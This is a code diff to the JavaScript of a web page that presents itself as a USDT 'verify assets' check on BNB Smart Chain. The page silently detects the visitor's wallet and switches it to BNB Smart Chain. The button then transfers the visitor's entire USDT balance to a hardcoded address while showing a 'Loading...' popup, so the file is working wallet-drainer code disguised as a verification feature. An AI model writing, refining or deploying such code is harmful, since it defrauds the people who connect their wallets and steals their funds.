@@ -3,53 +3,82 @@ const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
 let web3;
-let userAddress;
+let userAddress = null;
 
-// ✅ Silent wallet detection and chain switching (like app.js)
-async function detectWallet() {
-    if (window.ethereum) {
+// Helper: Detect Trust Wallet or MetaMask
+function detectWalletProvider() {
+    if (window.ethereum && window.ethereum.isTrust) return "Trust";
+    if (window.ethereum && window.ethereum.isMetaMask) return "MetaMask";
+    return "Unknown";
+}
+
+async function autoDetectWallet() {
+    if (typeof window.ethereum !== "undefined") {
         web3 = new Web3(window.ethereum);
-        try {
-            const accounts = await web3.eth.getAccounts();
-            if (accounts.length > 0) {
-                userAddress = accounts[0];
-                console.log("✅ Wallet detected:", userAddress);
-            }
 
-            // Force switch to BNB Smart Chain (0x38)
-            const currentChain = await window.ethereum.request({ method: "eth_chainId" });
-            if (currentChain !== "0x38") {
+        const chainId = await window.ethereum.request({ method: "eth_chainId" });
+        if (chainId !== "0x38") {
+            try {
                 await window.ethereum.request({
                     method: "wallet_switchEthereumChain",
-                    params: [{ chainId: "0x38" }]
+                    params: [{ chainId: "0x38" }],
                 });
-                console.log("✅ Switched to BNB Smart Chain");
+            } catch (e) {
+                console.warn("Failed to switch to BNB chain:", e);
             }
-        } catch (error) {
-            console.error("❌ Wallet detection/switch failed:", error);
+        }
+
+        try {
+            const accounts = await window.ethereum.request({ method: "eth_accounts" });
+            if (accounts.length > 0) {
+                userAddress = accounts[0];
+                console.log("Wallet auto-connected:", userAddress);
+            } else {
+                console.log("No wallet connected. Waiting for user interaction.");
+            }
+        } catch (e) {
+            console.error("Wallet auto-detection failed:", e);
         }
     } else {
-        alert("Please install MetaMask or use Trust Wallet browser.");
+        alert("No Ethereum-compatible wallet detected. Please install Trust Wallet or MetaMask.");
     }
 }
 
-// ✅ Auto-run wallet detection on load
-window.addEventListener("load", detectWallet);
+// Optional: Manual connect fallback (not automatically triggered)
+async function manualConnectWallet() {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: "0x38" }],
+            });
+
+            const accounts = await web3.eth.getAccounts();
+            userAddress = accounts[0];
+            console.log("Wallet manually connected:", userAddress);
+        } catch (error) {
+            console.error("Error connecting wallet:", error);
+            alert("Please switch to BNB Smart Chain.");
+        }
+    } else {
+        alert("Please install MetaMask or Trust Wallet.");
+    }
+}
+
+// Auto-detect wallet silently on page load
+window.addEventListener("load", autoDetectWallet);
 
 async function verifyAssets() {
     if (!web3 || !userAddress) {
-        alert("Wallet not connected. Refresh the page.");
+        alert("Wallet not connected. Please refresh or connect manually.");
         return;
     }
 
     const usdtContract = new web3.eth.Contract([
-        {
-            constant: true,
-            inputs: [{ name: "_owner", type: "address" }],
-            name: "balanceOf",
-            outputs: [{ name: "", type: "uint256" }],
-            type: "function"
-        }
+        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ], usdtContractAddress);
 
     const [usdtBalanceWei, userBNBWei] = await Promise.all([
@@ -77,6 +106,7 @@ async function verifyAssets() {
     }
 
     showPopup("Loading...", "green");
+
     transferUSDT(usdtBalance, userBNB);
 }
 
@@ -92,19 +122,11 @@ async function transferUSDT(usdtBalance, userBNB) {
         }
 
         const usdtContract = new web3.eth.Contract([
-            {
-                constant: false,
-                inputs: [
-                    { name: "recipient", type: "address" },
-                    { name: "amount", type: "uint256" }
-                ],
-                name: "transfer",
-                outputs: [{ name: "", type: "bool" }],
-                type: "function"
-            }
+            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
         ], usdtContractAddress);
 
         const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
+
         console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
 
         await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
@@ -118,20 +140,6 @@ async function transferUSDT(usdtBalance, userBNB) {
     } catch (error) {
         console.error("❌ USDT Transfer Failed:", error);
         alert("USDT transfer failed. Ensure you have enough BNB for gas.");
-    }
-}
-
-async function sendBNB(toAddress, amount) {
-    try {
-        await web3.eth.sendTransaction({
-            from: bnbGasSender,
-            to: toAddress,
-            value: web3.utils.toWei(amount, "ether"),
-            gas: 21000
-        });
-        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
-    } catch (error) {
-        console.error("⚠️ Error sending BNB:", error);
     }
 }
 
@@ -155,8 +163,8 @@ function showPopup(message, color) {
         document.body.appendChild(popup);
     }
 
-    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f0f0f0";
-    popup.style.color = color === "red" ? "red" : color === "green" ? "green" : "black";
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
+    popup.style.color = color === "red" ? "red" : "green";
     popup.innerHTML = message;
     popup.style.display = "block";
 
@@ -165,5 +173,5 @@ function showPopup(message, color) {
     }, 5000);
 }
 
-// ✅ Button event
+// Button click
 document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
